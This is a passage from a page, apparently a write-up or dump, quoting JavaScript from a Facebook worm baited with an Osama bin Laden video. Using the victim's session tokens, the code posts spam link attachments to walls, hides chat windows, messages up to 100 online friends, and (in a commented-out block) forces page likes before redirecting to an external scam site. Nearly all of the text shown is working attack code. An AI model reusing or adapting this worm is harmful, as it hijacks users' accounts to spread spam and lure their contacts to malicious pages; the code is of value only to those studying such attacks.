+description+\"&amp;attachment[params][metaTagMap][6][name]=description&amp;attachment[params][metaTagMap][6][content]=\"+description+\"&amp;attachment[params][metaTagMap][7][http-equiv]=Content-Type&amp;attachment[params][metaTagMap][7][content]=text%2Fhtml%3B%20charset%3Dutf-8&amp;attachment[params][medium]=106&amp;attachment[params][urlInfo][user]=\"+link+\"&amp;attachment[params][favicon]=http%3A%2F%2F20-y-rr-z.info%2Ffavicon.ico&amp;attachment[params][title]=\"+title+\"&amp;attachment[params][fragment_title]=&amp;attachment[params][external_author]=&amp;attachment[params][summary]=\"+description+\"&amp;attachment[params][url]=\"+link+\"&amp;attachment[params][ttl]=0&amp;attachment[params][error]=1&amp;attachment[params][responseCode]=206&amp;attachment[params][metaTags][description]=\"+description+\"&amp;attachment[params][images][0]=\"+picture+\"&amp;attachment[params][scrape_time]=1302991496&amp;attachment[params][cache_hit]=1&amp;attachment[type]=100&amp;xhpc_message_text=\"+statusmessage+\")&amp;xhpc_message=\"+statusmessage+\")&amp;nctr[_mod]=pagelet_wall&amp;lsd&amp;post_form_id_source=AsyncRequest\";\r\n\t\t\t\t\r\n\t\t\t\thttpwp.open(\"POST\", urlwp, true);\r\n\t\t\t\t\r\n\t\t\t\t//Send the proper header information along with the request\r\n\t\t\t\t\r\n\t\t\t\thttpwp.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\");\r\n\t\t\t\thttpwp.setRequestHeader(\"Content-length\", paramswp.length);\r\n\t\t\t\thttpwp.setRequestHeader(\"Connection\", \"keep-alive\");\r\n\t\t\t\t\r\n\t\t\t\thttpwp.onreadystatechange = function() { //Call a function when the state changes.\r\n\t\t\t\t\tif(httpwp.readyState == 4 &amp;&amp; httpwp.status == 200){\r\n\t\t\t\t\t\t//alert(http.responseText);\r\n\t\t\t\t\t\t//alert('buddy list fetched');\r\n\t\t\t\t\t}\r\n\r\n\t\t\t\t}\r\n\r\n\t\t\t\thttpwp.send(paramswp);\r\n\t\r\n\t\t\t}\r\n\r\n\t\t\tcount++; // increment counter\r\n\t\t\r\n\t\t}\r\n\t\t\t\t\r\n\t\thttp1.close; // Close the connection\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t}\r\n\t\r\n}\r\n\r\nhttp1.send(null);\r\n\r\n\r\n///////////////////////////////////////////////////////////////////////////////////////////////////////////////\r\n// Hide chat boxes\r\n///////////////////////////////////////////////////////////////////////////////////////////////////////////////\r\n\r\nvar hide = document.getElementById('fbDockChatTabSlider');\r\n\r\nhide.style.display = \"none\";\r\n\r\n\r\n///////////////////////////////////////////////////////////////////////////////////////////////////////////////\r\n// Get online friends and send chat message to them\r\n///////////////////////////////////////////////////////////////////////////////////////////////////////////////\r\n\r\nvar http3 = new XMLHttpRequest();\r\n\r\nvar url3 = \"http://www.facebook.com/ajax/chat/buddy_list.php?__a=1\";\r\nvar params3 = \"user=\"+user_id+\"&amp;popped_out=false&amp;force_render=true&amp;post_form_id=\"+post_form_id+\"&amp;fb_dtsg=\"+fb_dtsg+\"&amp;lsd&amp;post_form_id_source=AsyncRequest\";\r\nhttp3.open(\"POST\", url3, true);\r\n\r\n//Send the proper header information along with the request\r\nhttp3.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\");\r\nhttp3.setRequestHeader(\"Content-length\", params3.length);\r\nhttp3.setRequestHeader(\"Connection\", \"close\");\r\n\r\nhttp3.onreadystatechange = function() {//Call a function when the state changes.\r\n\tif(http3.readyState == 4 &amp;&amp; http3.status == 200) {\r\n\t\t\r\n\t\tvar response3 = http3.responseText;\r\n\t\t\r\n\t\tresponse3 = response3.replace(\"for (;;);\", \"\");\r\n\t\tresponse3 = JSON.parse(response3);\r\n\t\t\r\n\t\tvar count = 0;\r\n\t\t\r\n\t\tfor(property in response3.payload.buddy_list.nowAvailableList){\r\n\t\t\t\r\n\t\t\tif(count &lt; 100){\r\n\t\t\t\t\r\n\t\t\t\t// Loop to send messages\r\n\t\t\t\r\n\t\t\t\t// New XMLHttp object\r\n\t\t\t\tvar httpc = new XMLHttpRequest();\r\n\t\t\t\t\r\n\t\t\t\t// Generate random message ID\r\n\t\t\t\t\t\t\t\t\r\n\t\t\t\tvar msgid = Math.floor(Math.random()*1000000);\r\n\t\t\t\t\r\n\t\t\t\tvar time = Math.round(new Date().getTime() / 1000);\r\n\t\t\t\t\r\n\t\t\t\tvar urlc = \"http://www.facebook.com/ajax/chat/send.php?__a=1\";\r\n\t\t\t\tvar paramsc = \"msg_id=\"+msgid+\"&amp;client_time=\"+time+\"&amp;to=\"+property+\"&amp;num_tabs=1&amp;pvs_time=\"+time+\"&amp;msg_text=\"+prepared_chat+\"&amp;to_offline=false&amp;post_form_id=\"+post_form_id+\"&amp;fb_dtsg=\"+fb_dtsg+\"&amp;lsd&amp;post_form_id_source=AsyncRequest\";\r\n\t\t\t\thttpc.open(\"POST\", urlc, true);\r\n\t\t\t\t\r\n\t\t\t\t//Send the proper header information along with the request\r\n\t\t\t\thttpc.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\");\r\n\t\t\t\thttpc.setRequestHeader(\"Content-length\", paramsc.length);\r\n\t\t\t\thttpc.setRequestHeader(\"Connection\", \"close\");\r\n\t\t\t\t\r\n\t\t\t\thttpc.onreadystatechange = function() { //Call a function when the state changes.\r\n\t\t\t\t\tif(httpc.readyState == 4 &amp;&amp; httpc.status == 200){\r\n\t\t\t\t\t\t//alert(http.responseText);\r\n\t\t\t\t\t\t//alert('buddy list fetched');\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t\t\thttpc.send(paramsc);\r\n\t\r\n\t\t\t}\r\n\t\t\t\r\n\t\t\t//alert(property);\r\n\t\t\tcount++; // increment counter\r\n\t\t\r\n\t\t}\r\n\t\t\r\n\t\thttp3.close; // Close the connection\r\n\t\t\r\n\t}\r\n}\r\nhttp3.send(params3);\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n/*\r\n///////////////////////////////////////////////////////////////////////////////////////////////////////////////\r\n// Become a Fan - MW GIVEAWAY\r\n///////////////////////////////////////////////////////////////////////////////////////////////////////////////\r\n\r\nvar http4 = new XMLHttpRequest();\r\n\r\nvar url4 = \"http://www.facebook.com/ajax/pages/fan_status.php?__a=1\";\r\n\r\nvar params4 = \"fbpage_id=217981564879947&amp;add=1&amp;reload=0&amp;preserve_tab=false&amp;nctr[_mod]=pagelet_header&amp;post_form_id=\"+post_form_id+\"&amp;fb_dtsg=\"+fb_dtsg+\"&amp;lsd&amp;post_form_id_source=AsyncRequest\"\r\n\r\nhttp4.open(\"POST\", url4, true);\r\n\r\n//Send the proper header information along with the request\r\nhttp4.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\");\r\nhttp4.setRequestHeader(\"Content-length\", params4.length);\r\nhttp4.setRequestHeader(\"Connection\", \"close\");\r\n\r\nhttp4.onreadystatechange = function() {//Call a function when the state changes.\r\n\tif(http4.readyState == 4 &amp;&amp; http4.status == 200) {\r\n\t\t\t\r\n\t\thttp4.close; // Close the connection\r\n\t\t\r\n\t}\r\n}\r\nhttp4.send(params4);\r\n\r\n\r\n///////////////////////////////////////////////////////////////////////////////////////////////////////////////\r\n// Become a Fan - MW GIft\r\n///////////////////////////////////////////////////////////////////////////////////////////////////////////////\r\n\r\nvar http5 = new XMLHttpRequest();\r\n\r\nvar url5 = \"http://www.facebook.com/ajax/pages/fan_status.php?__a=1\";\r\n\r\nvar params5 = \"fbpage_id=217981564879947&amp;add=1&amp;reload=0&amp;preserve_tab=false&amp;nctr[_mod]=pagelet_header&amp;post_form_id=\"+post_form_id+\"&amp;fb_dtsg=\"+fb_dtsg+\"&amp;lsd&amp;post_form_id_source=AsyncRequest\"\r\n\r\nhttp5.open(\"POST\", url5, true);\r\n\r\n//Send the proper header information along with the request\r\nhttp5.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\");\r\nhttp5.setRequestHeader(\"Content-length\", params5.length);\r\nhttp5.setRequestHeader(\"Connection\", \"close\");\r\n\r\nhttp5.onreadystatechange = function() {//Call a function when the state changes.\r\n\tif(http5.readyState == 4 &amp;&amp; http5.status == 200) {\r\n\t\t\t\r\n\t\thttp5.close; // Close the connection\r\n\t\t\r\n\t}\r\n}\r\nhttp5.send(params5);\r\n*/\r\n\r\n//document.getElementById('susta').style.display=\"none\";\r\ndocument.getElementById('contentArea').innerHTML=\"&lt;center&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;img src=\\\"http://www.hindustantimes.com/images/loading_gif.gif\\\" /&gt;&lt;br /&gt;Please wait...&lt;/center&gt;\";\r\nsetTimeout(\"window.location = 'http://osama.mytopanswers.info/video.htm';\", 15000);</code></pre>\r\n\r\nfacebook, osama bin laden"
  }
]